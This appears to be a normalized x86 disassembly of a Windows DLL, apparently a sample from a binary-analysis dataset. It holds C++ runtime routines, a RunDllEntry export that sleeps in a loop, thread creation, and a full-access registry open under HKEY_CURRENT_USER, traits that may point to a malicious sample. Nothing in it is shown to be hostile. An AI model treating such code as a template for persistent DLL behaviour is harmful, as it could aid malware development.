sub_10001000
push 0x8
push r--data
call sub_1002ca38
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
dec eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
inc eax
call sub_1002ca7d
retn 0xc
call sub_100011b0
jmp r-xdata
sub_10001036
push 0x44
mov eax sub_1004fa98
call sub_10028203
xor edi edi
mov [ ebp - 0x4 ] edi
push ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] edi
call sub_100020aa
xor esi esi
mov [ ebp - 0x4 ] edi
inc esi
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x10 ] esi
call sub_1000134a
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
call sub_1000134a
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push ebx
mov [ ebp - 0x4 ] 0x2
call sub_100023b2
push edi
push esi
lea ecx [ ebp - 0x30 ]
call sub_10001500
push edi
push esi
lea ecx [ ebp - 0x4c ]
call sub_10001500
mov eax ebx
call sub_100282db
retn
sub_100010a7
push 0x0
mov eax sub_1004d106
call sub_10028203
mov edi ecx
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10001392
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_1000136c
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_1000136c
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000136c
lea eax [ edi + 0x70 ]
push eax
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10001392
lea eax [ edi + 0x88 ]
push eax
lea ecx [ esi + 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000136c
lea eax [ edi + 0xa4 ]
push eax
lea ecx [ esi + 0xa4 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000136c
lea eax [ edi + 0xc0 ]
push eax
lea ecx [ esi + 0xc0 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000136c
mov [ ebp - 0x4 ] 0x7
mov eax [ edi + 0xdc ]
mov [ esi + 0xdc ] eax
mov eax [ edi + 0xe0 ]
mov [ esi + 0xe0 ] eax
mov eax [ edi + 0xe4 ]
add edi 0xe8
push edi
lea ecx [ esi + 0xe8 ]
mov [ esi + 0xe4 ] eax
call sub_1000136c
mov eax esi
call sub_100282db
retn 0x4
sub_100011b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fb40
mov eax [ fs : 0x0 ]
push eax
sub esp 0x168
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x160 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x178 ]
mov [ fs : 0x0 ] eax
xor esi esi
lea ebx [ esp + 0x64 ]
mov [ esp + 0x14 ] esi
call sub_10001036
mov [ esp + 0x180 ] esi
mov eax [ esp + 0xe4 ]
sub eax [ esp + 0xe0 ]
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
ja r-xdata
push 0x2e0
call sub_10024389
pop ecx
mov [ esp + 0x1c ] eax
xor ebx ebx
inc ebx
mov [ esp + 0x180 ] 0x2
cmp eax esi
je r-xdata
push r--data
lea ecx [ esp + 0x24 ]
call sub_10001c7f
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x40 ]
mov [ esp + 0x184 ] 0x1
call sub_10002075
push r--data
lea eax [ esp + 0x40 ]
push eax
call sub_10027dd1
xor eax eax
push r--data
lea ecx [ esp + 0x24 ]
call sub_1000134a
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x68 ]
mov [ esp + 0x184 ] 0x3
push eax
push [ esp + 0x24 ]
mov [ esp + 0x20 ] ebx
call sub_10003f11
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push esi
push esi
push sub_1000118c
push esi
push esi
mov [ esp + 0x30 ] esi
call [ CreateThread@IAT ]
lea edi [ esp + 0x64 ]
call sub_1000211e
mov ecx [ esp + 0x178 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x160 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push esi
push ebx
lea ecx [ esp + 0x28 ]
call sub_10001500
mov [ rw-data ] eax
test [ esp + 0x14 ] bl
je r-xdata
RunDllEntry
push 0x8
push r--data
call sub_1002ca38
and [ ebp - 0x4 ] 0x0
push 0x578
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ca7d
retn
call sub_10004591
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp r-xdata
sub_1000136c
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_100016a9
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_10001450
mov eax esi
pop esi
retn 0x4
sub_10001392
push 0x14
mov eax sub_1004d08d
call sub_10028236
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x14 ] esp
call sub_10001599
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x10 ]
sub eax [ ebx + 0xc ]
push 0x1c
cdq
pop edi
idiv edi
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
cmp eax ecx
je r-xdata
mov eax esi
call sub_100282db
retn 0x8
mov edi esi
call sub_1000154b
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov edi ebx
mov ebx [ ebx + 0x10 ]
lea esi [ ebp - 0x18 ]
call sub_10018308
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_10018308
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
xor eax eax
lea edi [ ebp + 0xc ]
stosb [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ecx
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
call sub_1000196b
add esp 0x10
mov [ esi + 0x10 ] eax
sub_10001450
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10022f7c
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_100016c7
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10001629
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10001629
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_10001b42
add esp 0x10
push esi
mov ecx ebx
call sub_100016a9
sub_10001500
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_100016a9
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100242e6
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x8
push eax
call sub_10001b42
add esp 0x10
sub_1000154b
push esi
mov esi eax
cmp esi 0x9249249
jbe r-xdata
mov ecx esi
call sub_10001745
imul esi esi 0x1c
add esi eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] esi
mov al 0x1
pop esi
retn
call sub_1001827a
sub_10001599
push 0x0
push 0x1
call sub_100018cf
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov eax esi
retn 0x4
sub_100015b5
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1000188e
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_100016c7
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_10001450
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_10001b42
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_100016a9
sub_10001629
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_10001a0b
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_100016a9
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_100016c7
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10022f44
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_100017a7
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_100016a9
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_10001500
jmp r-xdata
mov eax edi
sub_10001745
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1c
jae r-xdata
xor ecx ecx
imul ecx ecx 0x1c
push ecx
call sub_10024389
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100243ff
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10027dd1
int3
sub_100017a7
push 0xc
mov eax sub_1004cbf2
call sub_10028236
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_1000191e
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_10001500
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_100016a9
call sub_100282db
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_10001b42
add esp 0x10
sub_10001807
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000191e
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_1000188e
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_100018cf
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_10024389
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100243ff
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10027dd1
int3
sub_1000191e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_10024389
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100243ff
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10027dd1
int3
sub_1000196b
push 0x8
mov eax sub_1004cd42
call sub_10028236
mov esi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_100282db
retn
mov ecx [ ebp + 0xc ]
push esi
call sub_100019c2
add [ ebp + 0xc ] 0x1c
add esi 0x1c
jmp r-xdata
cmp esi [ ebp + 0x8 ]
je r-xdata
sub_1000199a
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10001500
add esi 0x1c
push 0x0
call sub_10027dd1
mov eax [ ebp + 0xc ]
call sub_100282db
retn
sub_10001a33
push 0x4
mov eax sub_1004ceb9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1002446f
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001fc2
mov eax esi
call sub_100282db
retn 0x4
sub_10001a6d
push 0x4
mov eax sub_1004ceb9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100243ee
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001fc2
mov eax esi
call sub_100282db
retn 0x4
sub_10001b7b
push 0x4
mov eax sub_1004ceb9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1002446f
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001fc2
mov eax esi
call sub_100282db
retn 0x4
sub_10001bb5
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x10
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
add ecx eax
cmp ecx [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10001bf0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001bb5
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_10001ed2
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_10001f30
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_10001fe8
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10002004
sub_10001cd9
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ebx edx
mov ebx [ edx ]
jmp r-xdata
sub eax [ ebp + 0xc ]
add ebx edi
add ebx [ ebp + 0xc ]
push eax
push ebx
sub ecx edi
push ecx
add edx edi
push edx
call sub_10001cbd
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
add esp 0x10
push eax
mov ecx esi
call sub_10002004
pop ebx
mov edx [ edx ]
cmp ecx 0x10
jb r-xdata
sub_10001da6
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_10024389
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100243ff
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10027dd1
int3
sub_10001df0
push 0xc
mov eax sub_1004cb8e
call sub_10028236
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_10001da6
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
push 0xfffffffe
pop eax
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_10002020
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10002004
call sub_100282db
retn 0x8
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_10001fe8
add esp 0x10
sub_10001e4b
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10001da6
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_10001ed2
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10022f44
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_10001df0
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_10002004
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_10002020
jmp r-xdata
mov eax edi
sub_10001f30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10022f7c
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_10001ed2
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10001cd9
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10001cd9
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
add edi edx
push edi
push ecx
push eax
call sub_10001fe8
add esp 0x10
push esi
mov ecx ebx
call sub_10002004
sub_10001fc2
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002004
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_10001f30
mov eax esi
pop esi
retn 0x4
sub_10002020
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002004
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100242e6
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x10
push eax
call sub_10001fe8
add esp 0x10
sub_10002075
push 0x4
mov eax sub_1004ceb9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100243ee
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001fc2
mov eax esi
call sub_100282db
retn 0x4
sub_100020aa
push 0x0
mov eax sub_1004da3c
call sub_10028203
mov esi [ ebp + 0x8 ]
push esi
call sub_1000271f
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
call sub_10003efc
lea ecx [ esi + 0x38 ]
call sub_10003efc
lea ecx [ esi + 0x54 ]
call sub_10003efc
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000271f
lea ecx [ esi + 0x88 ]
call sub_10003efc
lea ecx [ esi + 0xa4 ]
call sub_10003efc
lea ecx [ esi + 0xc0 ]
call sub_10003efc
lea ecx [ esi + 0xe8 ]
call sub_10003efc
mov eax esi
call sub_100282db
retn 0x4
sub_1000211e
push ebx
push ebp
push esi
xor ebp ebp
xor ebx ebx
push ebp
inc ebx
push ebx
lea ecx [ edi + 0xe8 ]
call sub_10001500
push ebp
push ebx
lea ecx [ edi + 0xc0 ]
call sub_10001500
push ebp
push ebx
lea ecx [ edi + 0xa4 ]
call sub_10001500
push ebp
push ebx
lea ecx [ edi + 0x88 ]
call sub_10001500
lea esi [ edi + 0x70 ]
call sub_10001574
push [ esi ]
call sub_100242e6
pop ecx
push ebp
push ebx
lea ecx [ edi + 0x54 ]
call sub_10001500
push ebp
push ebx
lea ecx [ edi + 0x38 ]
call sub_10001500
push ebp
push ebx
lea ecx [ edi + 0x18 ]
call sub_10001500
mov esi edi
call sub_10001574
push [ edi ]
call sub_100242e6
pop ecx
pop esi
pop ebp
pop ebx
retn
sub_100021b7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fa41
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0xc ]
push r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0x18 ] eax
call sub_1000134a
xor edi edi
push r--data
lea ecx [ esp + 0x44 ]
mov [ esp + 0xdc ] edi
call sub_1000134a
lea eax [ esp + 0x5c ]
push eax
push 0xf003f
lea eax [ esp + 0x48 ]
push eax
push 0x80000001
lea eax [ esp + 0x88 ]
push eax
mov [ esp + 0xec ] 0x1
call sub_1001506f
push edi
push 0x1
lea ecx [ esp + 0x48 ]
call sub_10001500
push edi
push 0x1
lea ecx [ esp + 0x64 ]
mov [ esp + 0xe0 ] 0x4
call sub_10001500
mov esi r--data
push esi
lea ecx [ esp + 0x28 ]
call sub_1000134a
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x7c ]
push eax
mov [ esp + 0xe0 ] 0x5
call sub_10015443
mov bl al
neg bl
push edi
sbb bl bl
push 0x1
lea ecx [ esp + 0x2c ]
inc bl
mov [ esp + 0xe0 ] 0x4
call sub_10001500
test bl bl
jne r-xdata
lea ecx [ esp + 0x78 ]
call sub_10015175
mov ecx [ esp + 0xd0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb8 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x8
push esi
lea ecx [ esp + 0x28 ]
call sub_1000134a
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0xa4 ]
push eax
lea eax [ esp + 0x80 ]
push eax
mov [ esp + 0xe4 ] 0x6
call sub_1001519e
push edi
push 0x1
lea ecx [ esp + 0x2c ]
call sub_10001500
lea esi [ esp + 0x1c ]
lea eax [ esp + 0xa0 ]
call sub_1001552d
mov [ esp + 0xd8 ] 0x9
mov eax [ eax ]
cmp eax edi
je r-xdata
xor ecx ecx
lea ecx [ eax + 0x4 ]
jmp r-xdata
lea esi [ esp + 0xa0 ]
mov [ esp + 0xd8 ] 0x4
call sub_10015514
call sub_10003d5c
push [ esp + 0x18 ]
mov edx [ esp + 0x18 ]
call sub_10002621
mov [ esp + 0xd8 ] 0x8
mov ecx [ esp + 0x20 ]
cmp ecx edi
je r-xdata
sub_100023b2
push 0x18
mov eax sub_1004f9e2
call sub_10028203
push rw-data
mov [ ebp - 0x1c ] r--data
call sub_10015788
mov ecx eax
mov [ ebp - 0x18 ] ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push 0x69
pop edx
lea esi [ ebp - 0x24 ]
call sub_100159a6
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
call sub_10015aa5
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
xor ecx ecx
lea ecx [ eax + 0x4 ]
jmp r-xdata
call sub_100282db
retn 0xc
call sub_10003d5c
push [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_10002621
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
sub_10002426
push ecx
push ebx
push edi
mov ecx esi
mov edi eax
call sub_1000274f
push 0xffffffff
xor ebx ebx
push ebx
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_10001450
mov eax [ edi + 0x34 ]
push 0xffffffff
mov [ esi + 0x34 ] eax
push ebx
